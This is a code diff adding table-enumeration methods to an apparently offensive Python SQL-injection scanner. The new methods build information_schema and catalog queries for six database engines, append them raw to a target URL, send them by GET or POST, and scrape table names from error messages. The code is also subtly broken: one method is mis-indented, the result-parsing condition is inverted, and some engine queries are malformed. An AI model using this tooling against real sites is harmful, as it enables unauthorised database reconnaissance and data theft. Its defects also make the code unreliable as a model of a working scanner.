@@ -644,6 +644,150 @@ class SQLInjectionScanner:
             str3 = str1[:str2]
             print(f"Database name: {str3}")
 
+        async def get_table_names(self, dbname):
+        print(f"Getting table names for {self.database_type} database...")
+        
+        if self.database_type == "MySQL":
+            await self.perform_mysql_get_table_names(dbname)
+        elif self.database_type == "PostGre":
+            await self.perform_postgre_get_table_names(dbname)
+        elif self.database_type == "Microsoft_SQL":
+            await self.perform_microsoftsql_get_table_names(dbname)
+        elif self.database_type == "Oracle":
+            await self.perform_oracle_get_table_names(dbname)
+        elif self.database_type == "Advantage_Database":
+            await self.perform_advantage_get_table_names(dbname)
+        elif self.database_type == "Firebird":
+            await self.perform_firebird_get_table_names(dbname)
+        else:
+            print(f"Unsupported database type: {self.database_type}")
+
+    async def perform_mysql_get_table_names(self, dbname):
+        print("MySQL: Retrieving Table names...")
+        
+        query = f"SELECT table_name FROM information_schema.tables WHERE table_schema = '{dbname}'; --"
+        await self.execute_mysql_query(dbname, query, result_key='Table names')
+
+    async def perform_postgre_get_table_names(self, dbname):
+        print("PostgreSQL: Retrieving Table names...")
+        
+        query = f"SELECT table_name FROM information_schema.tables WHERE table_schema = '{dbname}'; --"
+        await self.execute_postgre_query(dbname, query, result_key='Table names')
+
+    async def perform_microsoftsql_get_table_names(self, dbname):
+        print("Microsoft SQL Server: Retrieving Table names...")
+        
+        query = f"SELECT table_name FROM information_schema.tables WHERE table_schema = '{dbname}'; --"
+        await self.execute_microsoftsql_query(dbname, query, result_key='Table names')
+
+    async def perform_oracle_get_table_names(self, dbname):
+        print("Oracle: Retrieving Table names...")
+        
+        query = f"SELECT table_name FROM all_tables WHERE owner = '{dbname}'; --"
+        await self.execute_oracle_query(dbname, query, result_key='Table names')
+
+    async def perform_advantage_get_table_names(self, dbname):
+        print("Advantage Database: Retrieving Table names...")
+        
+        query = f"SELECT AdsTableName FROM {dbname}.INFORMATION_SCHEMA.AdvantageTable WHERE AdsTableName IS NOT NULL; --"
+        await self.execute_advantage_query(dbname, query, result_key='Table names')
+
+    async def perform_firebird_get_table_names(self, dbname):
+        print("Firebird: Retrieving Table names...")
+        
+        query = f"SELECT rdb$relation_name FROM {dbname}.rdb$relations WHERE rdb$view_blr IS NULL; --"
+        await self.execute_firebird_query(dbname, query, result_key='Table names')
+
+
+    async def execute_mysql_query(self, dbname, query, result_key='Result'):
+        print(f"Executing query: {query}")
+
+        link = f"{self.target_url}+{query}"
+        try:
+            async with self.session.get(link) as response:
+                data = await response.text()
+                await self.extract_result(data, result_key)
+        except aiohttp.ClientError as e:
+            print(f"Error performing GET request for query '{query}': {e}")
+
+    async def execute_postgre_query(self, dbname, query, result_key='Result'):
+        print(f"Executing query: {query}")
+
+        post_data = {}
+        full_url = f'{self.target_url}+{query}'
+
+        try:
+            async with self.session.post(full_url, data=post_data) as response:
+                result = await response.text()
+                await self.extract_result(result, result_key)
+        except Exception as e:
+            print(f"Error performing POST request for query '{query}': {e}")
+
+    async def execute_microsoftsql_query(self, dbname, query, result_key='Result'):
+        print(f"Executing query: {query}")
+
+        post_data = {}
+        full_url = f'{self.target_url}+{query}'
+
+        try:
+            async with self.session.post(full_url, data=post_data) as response:
+                result = await response.text()
+                await self.extract_result(result, result_key)
+        except Exception as e:
+            print(f"Error performing POST request for query '{query}': {e}")
+
+    async def execute_oracle_query(self, dbname, query, result_key='Result'):
+        print(f"Executing query: {query}")
+
+        post_data = {}
+        full_url = f'{self.target_url}+{query}'
+
+        try:
+            async with self.session.post(full_url, data=post_data) as response:
+                result = await response.text()
+                await self.extract_result(result, result_key)
+        except Exception as e:
+            print(f"Error performing POST request for query '{query}': {e}")
+
+    async def execute_advantage_query(self, dbname, query, result_key='Result'):
+        print(f"Executing query: {query}")
+
+        post_data = {}
+        full_url = f'{self.target_url}+{query}'
+
+        try:
+            async with self.session.post(full_url, data=post_data) as response:
+                result = await response.text()
+                await self.extract_result(result, result_key)
+        except Exception as e:
+            print(f"Error performing POST request for query '{query}': {e}")
+
+    async def execute_firebird_query(self, dbname, query, result_key='Result'):
+        print(f"Executing query: {query}")
+
+        post_data = {}
+        full_url = f'{self.target_url}+{query}'
+
+        try:
+            async with self.session.post(full_url, data=post_data) as response:
+                result = await response.text()
+                await self.extract_result(result, result_key)
+        except Exception as e:
+            print(f"Error performing POST request for query '{query}': {e}")
+
+    async def extract_result(self, data, result_key):
+        print(f"Extracting {result_key}...")
+        str_num = str(data).find('error:')
+
+        if str_num == -1:
+            str1_num = data[str_num:]
+            str1 = str1_num[8:]
+            str2 = str1.find('\'')
+            str3 = str1[:str2]
+            print(f"{result_key}: {str3}")
+        else:
+            print('Access Denied')
+
     async def close_session(self):
         await self.session.close()
 
